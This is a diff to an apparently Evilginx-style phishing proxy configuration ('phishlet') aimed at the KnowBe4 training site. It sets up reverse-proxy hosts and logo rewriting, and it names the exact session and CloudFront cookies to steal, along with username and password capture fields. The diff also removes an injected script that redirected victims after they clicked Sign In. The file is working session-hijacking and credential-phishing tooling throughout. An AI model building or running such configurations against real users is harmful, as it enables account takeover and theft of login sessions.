@@ -4,14 +4,16 @@ proxy_hosts:
   - {phish_sub: 'training', orig_sub: 'training', domain: 'knowbe4.com', session: true, is_landing: true}
 sub_filters:   
 # Replace client's logo with knowbe4's
- - {triggers_on: 'training.knowbe4.com', orig_sub: 'training', domain: 'knowbe4.com', search: '"logoURL":"([^"]*)', replace: '"logoURL":"', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'training.knowbe4.com', orig_sub: 'training', domain: 'knowbe4.com', search: '"logoURL":"([^"]*)', replace: '"logoURL":"', mimes: ['text/html', 'application/json', 'application/x-javascript']}
 # Replace knowbe4's logo with clients
 # - {triggers_on: 'training.knowbe4.com', orig_sub: 'training', domain: 'knowbe4.com', search: '"logoURL":"([^"]*)', replace: '"logoURL":"https://example.com/client_logo.png', mimes: ['text/html', 'application/json', 'application/x-javascript', 'application/javascript']}
 auth_tokens:
-  - domain: '.training.knowbe4.com'
-    keys: ['.*,regexp']
-  - domain: '.knowbe4.com'
-    keys: ['.*,regexp']
+- domain: '.training.knowbe4.com'
+  keys: ['_knowbe4_session_new']
+- domain: 'training.knowbe4.com'
+  keys: ['CloudFront-Policy', 'CloudFront-Signature', 'CloudFront-Key-Pair-Id', 'previous_login_scope']
+auth_urls:
+  - '/learner/index.html'
 credentials:
   username:
     key: ''
@@ -24,30 +26,3 @@ credentials:
 login:
   domain: 'training.knowbe4.com'
   path: 'ui/login'
-# Handle redirect issue, only login page will have three buttons.
-# Hook Sign In button to redirect after they click it, keep checking for
-# buttons every second
-js_inject:
-  - trigger_domains: ["training.knowbe4.com"]
-    trigger_paths: ["/ui/login"]
-    script: |
-      async function worker() {
-        const elements = document.getElementsByTagName("BUTTON");
-        const num = elements.length;
-        if (num < 3) {
-          return;
-        } else {
-          document.getElementsByTagName("BUTTON")[0].onclick = redirectme;
-        }
-      }
-      function sleeptime(ms) {
-        return new Promise(resolve => setTimeout(resolve, ms));
-      }
-      async function redirectme() {
-        await sleeptime(2000);
-        window.location.href = "{redirect_url}";
-      }
-      function myFunction() {
-        var run = setInterval("worker()", 1000); 
-      }
-      myFunction();
